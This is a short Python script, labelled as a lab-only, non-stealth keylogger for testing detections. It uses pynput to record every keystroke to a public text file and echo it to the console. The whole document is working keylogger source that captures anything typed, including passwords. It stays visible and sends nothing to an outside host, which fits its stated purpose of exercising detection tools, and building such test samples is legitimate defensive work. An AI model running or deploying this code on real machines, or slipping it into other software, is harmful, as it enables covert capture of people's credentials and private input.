# keylogger_test.py — FOR LAB USE ONLY (educational)
# Simple non-stealth keylogger to test detections.
from pynput import keyboard
import os

OUT = r"C:\Users\Public\keylog_test.txt"  # public file for easy detection

def on_press(key):
    try:
        k = key.char
    except AttributeError:
        k = f"[{key}]"
    with open(OUT, "a", encoding="utf-8") as f:
        f.write(k)
    # print to console so you can see it's running
    print(k, end="", flush=True)

def main():
    print("Simple LAB keylogger started. Writing to", OUT)
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
